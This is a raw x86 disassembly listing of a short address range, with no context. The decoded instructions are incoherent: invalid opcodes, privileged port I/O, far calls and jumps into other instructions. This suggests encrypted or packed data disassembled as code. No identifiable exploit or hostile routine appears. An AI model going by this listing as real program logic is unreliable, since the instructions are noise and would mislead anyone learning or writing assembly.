  4275bc:	pop    ecx
  4275bd:	cmp    dh,BYTE PTR [ecx-0x1ac39246]
  4275c3:	dec    ebx
  4275c4:	retf   
  4275c5:	test   BYTE PTR [ecx-0x66a9e4e8],dl
  4275cb:	cmp    edx,esi
  4275cd:	or     eax,0xeed69e74
  4275d2:	mov    ecx,0x93e89634
  4275d7:	jg     0x4275d5
  4275d9:	imul   ebx,eax,0x6cb19a8a
  4275df:	sahf   
  4275e0:	out    dx,eax
  4275e1:	out    dx,eax
  4275e2:	push   ss
  4275e3:	fisubr WORD PTR [edi]
  4275e5:	mov    ebx,DWORD PTR [ebx-0x3a5f591a]
  4275eb:	adc    dh,BYTE PTR [ecx]
  4275ed:	leave  
  4275ee:	js     0x42759b
  4275f0:	in     eax,dx
  4275f1:	push   ecx
  4275f2:	div    BYTE PTR [eax-0x11e5a951]
  4275f8:	push   ebp
  4275f9:	neg    DWORD PTR [esi+0x2eca8b3a]
  4275ff:	dec    eax
  427600:	pop    ecx
  427601:	out    dx,al
  427602:	pusha  
  427603:	adc    DWORD PTR [ebp+0x15],eax
  427606:	inc    ebx
  427607:	mov    ch,0x73
  427609:	inc    esi
  42760a:	jns    0x4275cd
  42760c:	inc    edx
  42760d:	shr    DWORD PTR [edi],cl
  42760f:	and    dl,BYTE PTR [eax]
  427611:	pop    edi
  427612:	js     0x42761d
  427614:	pop    edx
  427615:	mov    al,ds:0x3adaacf3
  42761a:	sbb    DWORD PTR [ebp-0x1a534e43],esi
  427620:	mov    al,ds:0x625e56a2
  427625:	cli    
  427626:	add    ch,BYTE PTR [edi+0x5ddc802e]
  42762c:	sbb    eax,0x81d8ae87
  427631:	jo     0x4275f3
  427633:	or     al,0xfb
  427635:	ja     0x4275b9
  427637:	dec    ebp
  427638:	mov    edx,0x39dad827
  42763d:	cmp    eax,0x14e3f9cf
  427642:	mov    dl,0xb0
  427644:	jns    0x4276b2
  427646:	inc    esp
  427647:	push   ebx
  427648:	data16 cmp BYTE PTR [ebp-0x45204aa4],bh
  42764f:	jp     0x4276c5
  427651:	imul   esi,edx,0xeec72486
  427657:	mov    eax,0xf4671ac
  42765c:	daa    
  42765d:	mov    esi,DWORD PTR [ebx-0x61be1e4c]
  427663:	pop    es
  427664:	call   0xa26c:0xd3027e6c
  42766b:	and    al,0xd1
  42766d:	gs das 
  42766f:	(bad)  
  427670:	sbb    edi,DWORD PTR [eax-0x3df25a56]
  427676:	outs   dx,BYTE PTR ds:[esi]
  427677:	rol    DWORD PTR [ebx+0x499d46e3],1
  42767d:	push   es
  42767e:	jle    0x42763d
  427680:	mov    cs,WORD PTR [ecx+0x4c]
  427683:	mov    al,ds:0x86853e10
  427688:	add    BYTE PTR ds:0x7f93476b,cl
  42768e:	fild   DWORD PTR [ecx+0x5b]
  427691:	dec    ebx
  427692:	retf   
  427693:	test   DWORD PTR [ebp*4-0x3460169e],ebx
  42769a:	adc    DWORD PTR [ebp-0x1342450a],ecx
  4276a0:	dec    ecx
  4276a1:	xchg   BYTE PTR [ecx],al
  4276a3:	out    0xba,eax
  4276a5:	dec    esi
  4276a6:	sbb    al,0x90
  4276a8:	jb     0x4276ff
  4276aa:	mov    al,ds:0x8418c4b3
  4276af:	(bad)  
  4276b0:	out    dx,eax
  4276b1:	and    eax,0x96e784f9
  4276b6:	pop    ebx
  4276b7:	pop    ebp
  4276b8:	jbe    0x4276e6
  4276ba:	sub    al,0xd3
  4276bc:	cmc    
  4276bd:	add    BYTE PTR [eax],0x0
  4276c0:	add    BYTE PTR [eax],al
  4276c2:	or     al,ah
  4276c4:	mov    eax,ds:0x5ef7eff7
  4276c9:	std    
  4276ca:	mov    ebp,0x6ff91c3b
  4276cf:	add    ecx,DWORD PTR gs:[ecx-0x33]
  4276d3:	out    dx,al
  4276d4:	add    DWORD PTR [eax],eax
  4276d6:	hlt    
  4276d7:	add    al,0x0
  4276d9:	add    dh,dh
  4276db:	sar    DWORD PTR ds:0x304fde7e,1
  4276e1:	xchg   edi,eax
  4276e2:	mov    ebx,0x54a2139c
  4276e7:	rol    BYTE PTR [esi],cl
  4276e9:	push   ds
  4276ea:	mov    ebp,0xb9d2e7d0
  4276ef:	and    BYTE PTR [eax-0x2c4f3a67],ch
  4276f5:	mov    al,0x76
  4276f7:	xchg   ebx,eax
  4276f8:	lds    ebp,FWORD PTR [edi+0x6933b7c8]
  4276fe:	scas   al,BYTE PTR es:[edi]
  4276ff:	fisub  WORD PTR [ebx-0x20]
  427702:	xor    sp,WORD PTR [ebx-0x1fb5742f]
  427709:	enter  0xf679,0x6c
  42770d:	jnp    0x4276fd
  42770f:	aaa    
  427710:	mov    ds:0xe4c305e6,al
  427715:	pop    esi
  427716:	rol    BYTE PTR [edx+0x2aa9adef],cl
  42771c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42771d:	cli    
  42771e:	psraw  mm0,QWORD PTR [edi+0x113bf6f4]
  427725:	dec    eax
  427726:	(bad)  
  427727:	add    dl,0xcc
  42772a:	adc    bl,BYTE PTR [eax-0x65]
  42772d:	push   edi
  42772e:	fisttp QWORD PTR [ecx-0xb]
  427731:	mov    esp,0x1558f13d
  427736:	pop    ecx
  427737:	mov    edx,0x5cf3f5c1
  42773c:	push   edx
  42773d:	cmp    eax,0xe876321c
  427742:	ds mov ecx,edx
  427745:	icebp  
  427746:	mov    esi,0x591ce1d0
  42774b:	xor    BYTE PTR [edi-0x3d358ab4],0x69
  427752:	sbb    ecx,ecx
  427754:	ins    DWORD PTR es:[edi],dx
  427755:	mov    esi,0x851a7a2
  42775a:	jb     0x427714
  42775c:	nop
  42775d:	push   edi
  42775e:	mov    DWORD PTR [ecx-0x5e],ecx
  427761:	and    al,0x3a
  427763:	xchg   ebp,eax
  427764:	nop
  427765:	xor    DWORD PTR [esi],eax
  427767:	popf   
  427768:	in     eax,0x68
  42776a:	out    dx,al
  42776b:	pop    ds
  42776c:	aam    0x7a
  42776e:	cmp    ch,BYTE PTR [eax+0x598396e4]
  427774:	xor    eax,0x4b1b07c9
  427779:	std    
  42777a:	pop    ss
  42777b:	arpl   WORD PTR [edi-0x52],bp
  42777e:	imul   eax,DWORD PTR [ecx-0x33],0xffffffc3
  427782:	das    
  427783:	(bad)  
  427784:	jl     0x4277f9
  427786:	push   ebp
  427787:	push   ds
  427788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427789:	bound  eax,QWORD PTR [bp+di+0x3]
  42778d:	xchg   esp,eax
  42778e:	adc    dl,al
  427790:	dec    ebp
  427791:	xor    DWORD PTR [edi-0x516fa528],ebx
  427797:	cmp    al,0x69
  427799:	cmp    BYTE PTR ds:0x91317f66,dl
  42779f:	js     0x42775e
  4277a1:	inc    edx
  4277a2:	cld    
  4277a3:	mov    esi,0xd1c9e3c5
  4277a8:	xchg   ebx,eax
  4277a9:	fdivr  DWORD PTR [edi]
  4277ab:	xchg   edx,eax
  4277ac:	xchg   ebp,eax
  4277ad:	clc    
  4277ae:	js     0x427768
  4277b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277b1:	cmp    DWORD PTR ds:0xbdf170f1,edx
  4277b7:	mov    esi,0x89f6ad4
  4277bc:	ja     0x4277a3
  4277be:	adc    DWORD PTR [edx],ebp
  4277c0:	push   0x3cfcdca1
  4277c5:	xchg   ebx,eax
  4277c6:	jo     0x42778f
  4277c8:	int3   
  4277c9:	xor    ebp,edi
  4277cb:	sub    al,0xbb
  4277cd:	fisub  DWORD PTR [ebx]
  4277cf:	sub    DWORD PTR [ebp+0x47],eax
  4277d2:	sahf   
  4277d3:	add    eax,0x7645b9c5
  4277d8:	(bad)  
  4277d9:	xor    eax,0x725d92aa
  4277de:	mov    ds:0x5044bf56,eax
  4277e3:	push   es
  4277e4:	aam    0xd2
  4277e6:	sub    dl,BYTE PTR [eax+eax*1+0x1e04e7bc]
  4277ed:	and    BYTE PTR [esi],0x17
  4277f0:	adc    bl,BYTE PTR [esi-0x6c31e977]
  4277f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277f7:	add    edx,ebx
  4277f9:	mov    ebp,0x2c8b364e
  4277fe:	push   ebp
  4277ff:	jg     0x4277f3
  427801:	mov    cl,0x20
  427803:	pop    edx
  427804:	aas    
  427805:	xchg   ebx,eax
  427806:	cwde   
  427807:	mov    ebx,0x4cbdd815
  42780c:	cmc    
  42780d:	fcom   QWORD PTR [eax-0x77]
  427810:	cmp    edx,ecx
  427812:	mov    ?,WORD PTR [eax+0x5b]
  427815:	inc    edi
  427816:	nop
  427817:	jle    0x42782b
  427819:	into   
  42781a:	add    esi,edx
  42781c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42781d:	or     BYTE PTR [edi+0x6e],0x74
  427821:	or     al,0xf4
  427823:	ins    BYTE PTR es:[edi],dx
  427824:	or     bl,BYTE PTR [ebx+eax*2-0x24]
  427828:	pop    es
  427829:	mov    es,WORD PTR fs:[ecx-0x1ee07972]
  427830:	mov    cl,0xa
  427832:	retf   
  427833:	sti    
  427834:	test   eax,0x959d981f
  427839:	sub    BYTE PTR [eax+edx*2],cl
  42783c:	push   0xfffffffa
  42783e:	aam    0x9e
  427840:	test   eax,0x1ad20fbc
  427845:	call   0xd881:0xe4e3790
  42784c:	bound  edx,QWORD PTR [eax]
  42784e:	cs add ebx,ecx
  427851:	mov    ebp,0xf77fe685
  427856:	pop    es
  427857:	push   ebx
  427858:	adc    edx,ecx
  42785a:	int3   
  42785b:	pop    esp
  42785c:	mov    ds:0xcc45a2f4,al
  427861:	in     al,dx
  427862:	test   BYTE PTR [ecx+edx*8+0x645b8b10],dh
  427869:	lahf   
  42786a:	inc    esp
  42786b:	pop    ecx
  42786c:	sbb    eax,0x7600ea02
  427871:	xor    al,0xb4
  427873:	js     0x4278cf
  427875:	push   ss
  427876:	jmp    0x4278dd
  427878:	inc    eax
  427879:	jne    0x427827
  42787b:	lea    ebx,[ecx]
  42787d:	add    eax,0xa16cd7b8
  427882:	xchg   edi,ebp
  427884:	jnp    0x4278ea
  427886:	mov    ds:0xd140c57b,eax
  42788b:	ret    
  42788c:	mov    edi,0xa343a63d
  427891:	cld    
  427892:	push   cs
  427893:	pop    ss
  427894:	stc    
  427895:	xor    BYTE PTR [esi-0x6cab0449],ch
  42789b:	mov    WORD PTR [edi-0x2c7ccc23],cs
  4278a1:	pop    ds
  4278a2:	cs nop
  4278a4:	mov    ebx,0x68b2e3bc
  4278a9:	les    ebx,FWORD PTR [ecx-0x2a]
  4278ac:	xchg   edi,eax
  4278ad:	mov    al,ds:0xef3cf9e8
  4278b2:	xchg   edi,eax
  4278b3:	rcr    DWORD PTR [ecx+0x34cfe4f1],1
  4278b9:	cs icebp 
  4278bb:	bound  ebx,QWORD PTR [ebx-0x3659e571]
  4278c1:	xor    al,0x5e
  4278c3:	jecxz  0x4278cc
  4278c5:	fild   WORD PTR [edx-0x7e]
  4278c8:	les    ebx,FWORD PTR [ecx+0x1b466f8]
  4278ce:	sbb    al,0x79
  4278d0:	outs   dx,DWORD PTR ds:[esi]
  4278d1:	add    ecx,DWORD PTR [esi+0x72]
  4278d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278d5:	shr    BYTE PTR [eax-0x68],0xaa
  4278d9:	dec    edi
  4278da:	push   eax
  4278db:	retf   
  4278dc:	lea    ebp,[eax-0x687a4fa8]
  4278e2:	cli    
  4278e3:	shr    DWORD PTR [ecx+ebp*4],0xae
  4278e7:	popf   
  4278e8:	lahf   
  4278e9:	icebp  
  4278ea:	call   0x8744:0x45465012
  4278f1:	leave  
  4278f2:	sbb    DWORD PTR [ecx],ebp
  4278f4:	call   0x5f37fcdd
  4278f9:	sub    edx,edx
  4278fb:	adc    eax,0x5195d43f
  427900:	in     al,0x9d
  427902:	or     DWORD PTR [edx-0x794c4fc7],ebx
  427908:	daa    
  427909:	or     esi,DWORD PTR [edi+0x6]
  42790c:	sbb    al,0x55
  42790e:	or     esi,DWORD PTR [esi+0x25]
  427911:	ret    
  427912:	and    eax,0x80292a26
  427917:	jo     0x4278d6
  427919:	sbb    dh,BYTE PTR [edx]
  42791b:	pop    esi
  42791c:	loope  0x427950
  42791e:	jmp    0x405f:0x9c921b9a
  427925:	clc    
  427926:	leave  
  427927:	sub    BYTE PTR ds:0xc410c6d8,ch
  42792d:	das    
  42792e:	or     bh,BYTE PTR [esi]
  427930:	aaa    
  427931:	test   eax,0xa5f94c35
  427936:	pusha  
  427937:	imul   edi,ebx,0xf18617b8
  42793d:	and    BYTE PTR [ebx],0x1f
  427940:	fsub   st(6),st
  427942:	cmp    eax,esp
  427944:	test   eax,0x38258b3d
  427949:	test   eax,0x116b917
  42794e:	sub    al,0x53
  427950:	fcmovbe st,st(5)
  427952:	mov    ebp,0x926087c
  427957:	xchg   edx,edi
  427959:	push   ebp
  42795a:	add    eax,0xc1b8eba0
  42795f:	jae    0x4279a2
  427961:	cmp    ch,ah
  427963:	test   DWORD PTR [edi+esi*2+0x5d],eax
  427967:	and    al,0xe1
  427969:	jb     0x427959
  42796b:	mov    ebp,0x10356b2c
  427970:	lods   al,BYTE PTR ds:[esi]
  427971:	mov    DWORD PTR [edi-0x15a420f3],ecx
  427977:	jbe    0x4279d0
  427979:	and    ecx,DWORD PTR [eax-0x124cf677]
  42797f:	shr    BYTE PTR [edx+ebp*2-0x3a551669],cl
  427986:	sbb    cl,dl
  427988:	sub    al,0x83
  42798a:	repnz mov eax,ds:0x351f0729
  427990:	or     BYTE PTR ds:0x2bbd3235,ch
  427996:	aad    0x95
  427998:	test   edi,ebp
  42799a:	add    al,0x31
  42799c:	adc    ebx,DWORD PTR [edi+0x6b9f5fb7]
  4279a2:	mov    ah,ch
  4279a4:	adc    DWORD PTR [ebx],ebp
  4279a6:	mov    ds:0x67ecff3b,al
  4279ab:	fdiv   QWORD PTR [ebx-0x62417210]
  4279b1:	stos   DWORD PTR es:[edi],eax
  4279b2:	repz enter 0xd694,0xa3
  4279b7:	mov    bh,0xe7
  4279b9:	in     al,0xfa
  4279bb:	(bad)  
  4279bc:	call   0xab81c2d5
  4279c1:	adc    al,0x2
  4279c3:	bswap  edx
  4279c5:	sti    
  4279c6:	add    DWORD PTR [esi],ebx
  4279c8:	jns    0x4279dc
  4279ca:	jl     0x42796c
  4279cc:	fnstcw WORD PTR [esi-0x692031cf]
  4279d2:	ror    DWORD PTR [edx+0x6731f092],cl
  4279d8:	lds    edx,FWORD PTR [ecx+edi*8+0x37]
  4279dc:	icebp  
  4279dd:	mov    ds:0x57cc6262,eax
  4279e2:	mov    eax,0x8ed3ab45
  4279e7:	call   0x76e0f0d5
  4279ec:	adc    esp,ecx
  4279ee:	mov    bl,0xbc
  4279f0:	fnstenv ds:0xfd27969f
  4279f6:	xchg   BYTE PTR [ebx+0x47],ch
  4279f9:	jno    0x427a4b
  4279fb:	test   BYTE PTR [eax+ecx*4],ah
  4279fe:	jg     0x427a4a
  427a00:	jecxz  0x4279c1
  427a02:	jns    0x4279d3
  427a04:	add    al,0xc7
  427a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a07:	(bad)  [esi]
  427a09:	mov    ah,0x51
  427a0b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  427a0d:	test   DWORD PTR [edx+ecx*8],0x9856eead
  427a14:	mov    eax,ds:0xbcacf292
  427a19:	jno    0x427a8d
  427a1b:	or     BYTE PTR [eiz*4-0x467e2404],bh
  427a22:	shr    DWORD PTR [edi-0x52fa661],0x4e
  427a29:	pop    ecx
  427a2a:	(bad)  [eax]
  427a2c:	push   0xffffffef
  427a2e:	test   eax,0xeaa5daff
  427a33:	mov    dh,0xfe
  427a35:	or     eax,DWORD PTR [ebp-0x5334d984]
  427a3b:	mov    al,0xae
  427a3d:	neg    BYTE PTR [edx+0xe]
  427a40:	mov    eax,ds:0x46bf0776
  427a45:	mov    ebx,0x94c0029b
  427a4a:	push   eax
  427a4b:	xchg   esp,eax
  427a4c:	mov    ah,0x79
  427a4e:	sub    BYTE PTR ds:0xc1ca7101,bl
  427a54:	mov    al,0x18
  427a56:	mov    BYTE PTR [esi+0x72],0x4e
  427a5a:	sub    eax,0xf5f7abec
  427a5f:	inc    esi
  427a60:	mov    cl,0x84
  427a62:	jo     0x427a7c
  427a64:	sbb    ebp,DWORD PTR [esi*1+0x39384ac1]
  427a6b:	xor    DWORD PTR [ebp+0x6],0x6a
  427a6f:	xchg   ecx,eax
  427a70:	xchg   edx,eax
  427a71:	fldlg2 
  427a73:	xchg   BYTE PTR [eax-0x3bb89823],dl
  427a79:	cmp    bh,bh
  427a7b:	test   al,0xe7
  427a7d:	aaa    
  427a7e:	and    esp,ebx
  427a80:	lea    ebx,[eax]
  427a82:	and    cl,0xe8
  427a85:	xchg   BYTE PTR ds:0xb9a86c29,dh
  427a8b:	mov    esp,0xdeec1017
  427a90:	dec    edx
  427a91:	add    esp,ecx
  427a93:	inc    ecx
  427a94:	xor    al,0xd9
  427a96:	out    dx,eax
  427a97:	rol    DWORD PTR [ecx-0x55c086e1],1
  427a9d:	mov    esp,0xa316524c
  427aa2:	and    al,0x21
  427aa4:	jno    0x427b0c
  427aa6:	mov    eax,ds:0xaef0ffe5
  427aab:	jns    0x427ae2
  427aad:	or     ebp,DWORD PTR [ecx+0x16]
  427ab0:	rcl    DWORD PTR [esi+0x7f],1
  427ab3:	in     al,0x4b
  427ab5:	push   edx
  427ab6:	retf   
  427ab7:	xor    eax,0xf412be3b
  427abc:	icebp  
  427abd:	(bad)  [ebp-0x44]
  427ac0:	out    dx,al
  427ac1:	test   al,0xad
  427ac3:	pop    edx
  427ac4:	adc    BYTE PTR [edi-0xc59b56f],cl
  427aca:	jae    0x427b15
  427acc:	ja     0x427ad7
  427ace:	xchg   ebx,eax
  427acf:	test   esi,esp
  427ad1:	cld    
  427ad2:	test   eax,0xe64b2899
  427ad7:	jne    0x427b4f
  427ad9:	mov    ds:0xcba2414f,eax
  427ade:	jmp    0x9af9d8df
  427ae3:	sbb    bl,dl
  427ae5:	push   eax
  427ae6:	cdq    
  427ae7:	into   
  427ae8:	sbb    BYTE PTR [edi],dh
  427aea:	push   0xfffffff0
  427aec:	push   0x57
  427aee:	dec    edi
  427aef:	std    
  427af0:	test   eax,0x11a0ac7
  427af5:	dec    ecx
  427af6:	fstp   QWORD PTR [ecx-0xc6578f0]
  427afc:	daa    
  427afd:	push   ecx
  427afe:	fcom   QWORD PTR [esi-0x56a944dc]
  427b04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b05:	aam    0xe
  427b07:	jo     0x427ad3
  427b09:	pop    es
  427b0a:	fs into 
  427b0c:	or     BYTE PTR [esi],bl
  427b0e:	cmp    DWORD PTR [edi+0x28],0xfffffff9
  427b12:	enter  0x8753,0x35
  427b16:	xchg   ecx,eax
  427b17:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  427b19:	stos   DWORD PTR es:[edi],eax
  427b1a:	repnz push cs
  427b1c:	sub    ah,BYTE PTR [ecx-0x7cf7cba6]
  427b22:	dec    esi
  427b23:	mov    ebx,0x40d01a9b
  427b28:	out    dx,eax
  427b29:	push   ecx
  427b2a:	jb     0x427b35
  427b2c:	mov    esi,0x1e9f2918
  427b31:	xor    eax,0x5f477766
  427b36:	adc    al,0x56
  427b38:	jg     0x427b2e
  427b3a:	pusha  
  427b3b:	xchg   esp,eax
  427b3c:	jle    0x427b40
  427b3e:	mov    ch,0xbc
  427b40:	adc    ebp,DWORD PTR [ecx+0x3ab4c44b]
  427b46:	sbb    esi,DWORD PTR [ebx+ebp*8]
  427b49:	jno    0x427ae8
  427b4b:	repnz and edx,edx
  427b4e:	sbb    BYTE PTR [edi+0x7374ab11],0x85
  427b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b56:	mov    bh,0xd7
  427b58:	jmp    0x4f611dad
  427b5d:	adc    DWORD PTR [esi-0x41a86fb8],esp
  427b63:	nop
  427b64:	cli    
  427b65:	xlat   BYTE PTR ds:[ebx]
  427b66:	das    
  427b67:	pop    edi
  427b68:	pop    ecx
  427b69:	(bad)  [ecx+0x68]
  427b6c:	mov    cl,0x1b
  427b6e:	ins    DWORD PTR es:[edi],dx
  427b6f:	adc    DWORD PTR [edi+eiz*8],edi
  427b72:	pop    esi
  427b73:	push   es
  427b74:	arpl   WORD PTR [ebx+0x67ade5ea],sp
  427b7a:	jnp    0x427b8a
  427b7c:	and    ch,BYTE PTR [eax+0x27274ae7]
  427b82:	lea    ebp,[edx+0x69]
  427b85:	je     0x427bce
  427b87:	push   0xdbf56b50
  427b8c:	mov    ch,0xc7
  427b8e:	jns    0x427bd0
  427b90:	dec    ebx
  427b91:	and    al,0x23
  427b93:	xor    DWORD PTR [esi+0x3a29ae23],edx
  427b99:	retf   0x49cd
  427b9c:	push   edx
  427b9d:	push   ds
  427b9e:	xor    al,0xf0
  427ba0:	call   0x1f13:0x3afb1e28
  427ba7:	outs   dx,DWORD PTR ds:[esi]
  427ba8:	loope  0x427b8f
  427baa:	inc    esi
  427bab:	repnz or eax,0xa450cedb
  427bb1:	ss mov ebx,0xe4654c3d
  427bb7:	sbb    DWORD PTR [edx-0x29],edx
  427bba:	and    ebp,DWORD PTR [edx+0x18955c0c]
  427bc0:	mov    ecx,0x7f0c3e98
  427bc5:	xor    edx,ebp
  427bc7:	out    0xbd,eax
  427bc9:	push   ecx
  427bca:	push   ebx
  427bcb:	and    esi,DWORD PTR [ebx]
  427bcd:	add    BYTE PTR es:[eax],al
  427bd0:	add    BYTE PTR [eax],al
  427bd2:	ja     0x427bca
  427bd4:	push   ecx
  427bd5:	dec    edi
  427bd6:	shr    edi,1
  427bd8:	jg     0x427bd8
  427bda:	push   cs
  427bdb:	mov    edi,0x1a6ee2d0
  427be0:	sbb    BYTE PTR [eax+0x1f3c1],al
  427be6:	hlt    
  427be7:	add    al,0x0
  427be9:	add    BYTE PTR [edi+0x79],ch
  427bec:	pop    edx
  427bed:	pop    ebx
  427bee:	out    dx,al
  427bef:	xchg   edx,eax
  427bf0:	imul   esi,DWORD PTR [ecx-0x4f],0x2cf13b0a
  427bf7:	retf   0x2dfa
  427bfa:	adc    BYTE PTR [edx],dl
  427bfc:	pop    edx
  427bfd:	mov    bl,0xad
  427bff:	cmp    eax,edi
  427c01:	(bad)  
  427c02:	adc    al,0xbf
  427c04:	out    0x85,al
  427c06:	test   eax,0xd895c02a
  427c0b:	outs   dx,BYTE PTR ds:[esi]
  427c0c:	inc    ebp
  427c0d:	sbb    eax,0x18350fdb
  427c12:	inc    ebp
  427c13:	and    al,0x19
  427c15:	(bad)  [ecx]
  427c17:	sbb    dl,BYTE PTR [edi+0x49]
  427c1a:	mov    ch,BYTE PTR [eax-0x35]
  427c1d:	mov    esi,0x84862c42
  427c22:	ret    0xe550
  427c25:	pushw  0xfff6
  427c28:	lds    eax,FWORD PTR [edi-0x2dc40e2d]
  427c2e:	adc    eax,0x8be66461
  427c33:	fs and esp,edx
  427c36:	fild   WORD PTR [edi-0xce6da2]
  427c3c:	and    DWORD PTR [esi],eax
  427c3e:	fnstenv [eax]
  427c40:	fiadd  DWORD PTR [ebx+0x54e4a61f]
  427c46:	push   ecx
  427c47:	jge    0x427cc1
  427c49:	loopne 0x427ca3
  427c4b:	dec    edi
  427c4c:	mov    edx,0xe66f7bf0
  427c51:	push   ds
  427c52:	mov    ds:0x463de3e4,al
  427c57:	ja     0x427bf0
  427c59:	xchg   BYTE PTR [edi],cl
  427c5b:	gs jnp 0x427c2f
  427c5e:	in     al,0x20
  427c60:	fldcw  WORD PTR [eax-0x2b3f98b1]
  427c66:	fwait
  427c67:	mov    ds:0xaee8d1a5,al
  427c6c:	xchg   ebx,eax
  427c6d:	mov    ah,0x30
  427c6f:	push   ebx
  427c70:	push   eax
  427c71:	xlat   BYTE PTR ds:[ebx]
  427c72:	nop
  427c73:	retf   0xa95
  427c76:	jle    0x427cb0
  427c78:	xor    ecx,esi
  427c7a:	adc    al,0x35
  427c7c:	in     al,0x2c
  427c7e:	lds    esp,FWORD PTR [edi-0x4]
  427c81:	hlt    
  427c82:	push   es
  427c83:	mov    cl,0x3e
  427c85:	sbb    BYTE PTR [eax],dl
  427c87:	cmc    
  427c88:	adc    DWORD PTR [edi],eax
  427c8a:	pop    ss
  427c8b:	cmp    BYTE PTR [edx],dh
  427c8d:	retf   
  427c8e:	xchg   ebp,eax
  427c8f:	rep outs dx,DWORD PTR ds:[esi]
  427c91:	inc    eax
  427c92:	jb     0x427c89
  427c94:	test   edx,ebx
  427c96:	js     0x427ca7
  427c98:	mov    eax,0x11f4bb8f
  427c9d:	sub    eax,0xf7c76bf8
  427ca2:	dec    edx
  427ca3:	push   ebp
  427ca4:	adc    edx,DWORD PTR [ecx]
  427ca6:	outs   dx,DWORD PTR ds:[esi]
  427ca7:	pop    es
  427ca8:	mov    DWORD PTR [eax+0x62],edi
  427cab:	pop    eax
  427cac:	push   edi
  427cad:	or     eax,0x5d4fb581
  427cb2:	mov    eax,ds:0xd3b0e88a
  427cb7:	jg     0x427c6d
  427cb9:	mov    bl,0x13
  427cbb:	pop    ecx
  427cbc:	cmp    BYTE PTR [ebp-0x5a],bh
  427cbf:	fwait
  427cc0:	popf   
  427cc1:	mov    esi,0xfe272581
  427cc6:	add    eax,0xbc14161b
  427ccb:	call   0xabb60e7f
  427cd0:	cmp    eax,0xd002b407
  427cd5:	icebp  
  427cd6:	jmp    0x427d1f
  427cd8:	add    edx,DWORD PTR [edx+0x56b67ef]
  427cde:	jge    0x427d25
  427ce0:	mov    cl,0x9e
  427ce2:	call   0xc6f1:0xa5d8957
  427ce9:	fdivrp st(7),st
  427ceb:	sbb    eax,esi
  427ced:	in     al,0x47
  427cef:	dec    edi
  427cf0:	sti    
  427cf1:	rcl    DWORD PTR [edi+0x62],1
  427cf4:	lods   eax,DWORD PTR ds:[esi]
  427cf5:	mov    dl,0xd6
  427cf7:	lds    ebx,FWORD PTR [esi-0x1c]
  427cfa:	stos   BYTE PTR es:[edi],al
  427cfb:	pop    es
  427cfc:	sub    ebx,esp
  427cfe:	mov    ch,0x2e
  427d00:	and    DWORD PTR [ebp-0x80],edx
  427d03:	pop    ebx
  427d04:	sbb    ecx,ebp
  427d06:	retf   
  427d07:	arpl   WORD PTR [edx+0x0],bx
  427d0a:	test   eax,0x80ecbc4d
  427d0f:	inc    ebp
  427d10:	ret    
  427d11:	repz scas eax,DWORD PTR es:[edi]
  427d13:	sbb    BYTE PTR [esi-0x19],dl
  427d16:	add    DWORD PTR [ebx],0x7f
  427d19:	dec    eax
  427d1a:	inc    edi
  427d1b:	jge    0x427d9a
  427d1d:	push   ebx
  427d1e:	mov    ds:0x35f85e7,eax
  427d23:	loopne 0x427d50
  427d25:	push   ebx
  427d26:	ds or  al,0x9e
  427d29:	xor    dh,ah
  427d2b:	jns    0x427d9d
  427d2d:	popf   
  427d2e:	xchg   ebx,eax
  427d2f:	adc    BYTE PTR [edx-0x4b],bl
  427d32:	ror    DWORD PTR [ebx+0x26],1
  427d35:	idiv   BYTE PTR [ebp+0x20]
  427d38:	fnstsw WORD PTR [esi-0x75ec2b78]
  427d3e:	call   0x3d43:0xb06fd016
  427d45:	mov    al,0x5c
  427d47:	call   DWORD PTR [edi]
  427d49:	inc    edx
  427d4a:	call   0xf729:0x373cde13
  427d51:	inc    ebx
  427d52:	ror    DWORD PTR [ebp+edx*4-0x2e],1
  427d56:	dec    esp
  427d57:	(bad)  
  427d58:	xor    DWORD PTR [ebx+0x9],eax
  427d5b:	lds    ebp,FWORD PTR [ebp+0x7f]
  427d5e:	scas   eax,DWORD PTR es:[edi]
  427d5f:	pop    ss
  427d60:	dec    ebx
  427d61:	ror    BYTE PTR [edi+0x1f],0x90
  427d65:	ficomp DWORD PTR [ecx-0x7]
  427d68:	cmp    dh,BYTE PTR [ecx]
  427d6a:	ja     0x427d96
  427d6c:	das    
  427d6d:	pop    ebx
  427d6e:	mov    al,0x37
  427d70:	mov    eax,0xe4b3d957
  427d75:	sub    DWORD PTR [eax+0x424a6b73],0x43
  427d7c:	ror    BYTE PTR [ecx-0x44],1
  427d7f:	in     al,dx
  427d80:	pop    ecx
  427d81:	rol    BYTE PTR [ebx],cl
  427d83:	imul   esp,DWORD PTR [ebp+0x67],0x54728e7f
  427d8a:	or     BYTE PTR [ebx+0x7e],ch
  427d8d:	pusha  
  427d8e:	sbb    edi,edi
  427d90:	lods   al,BYTE PTR ds:[esi]
  427d91:	mov    edi,0x88cc08e5
  427d96:	imul   eax
  427d98:	adc    al,0x6b
  427d9a:	in     al,0xf6
  427d9c:	inc    esp
  427d9d:	mov    ebx,0x2d4e18fd
  427da2:	popf   
  427da3:	call   0xc41ae62d
  427da8:	xchg   DWORD PTR [esi-0x1f],eax
  427dab:	push   esi
  427dac:	cmp    edi,DWORD PTR [eax-0x57f3e26d]
  427db2:	sbb    ebx,edi
  427db4:	adc    edi,ebx
  427db6:	push   ebp
  427db7:	leave  
  427db8:	(bad)  
  427db9:	retf   0xf4e9
  427dbc:	bound  ebp,QWORD PTR [edx+edi*1]
  427dbf:	sub    ch,BYTE PTR [esp+ebx*2+0x79933245]
  427dc6:	cs jnp 0x427d54
  427dc9:	stc    
  427dca:	retf   0x9e8c
  427dcd:	shr    BYTE PTR ds:0x98836581,1
  427dd3:	inc    edx
  427dd4:	scas   al,BYTE PTR es:[edi]
  427dd5:	aaa    
  427dd6:	hlt    
  427dd7:	push   edx
  427dd8:	push   es
  427dd9:	or     eax,0xfcd42ea9
  427dde:	inc    ebp
  427ddf:	push   eax
  427de0:	loopne 0x427e4a
  427de2:	mov    cl,0x15
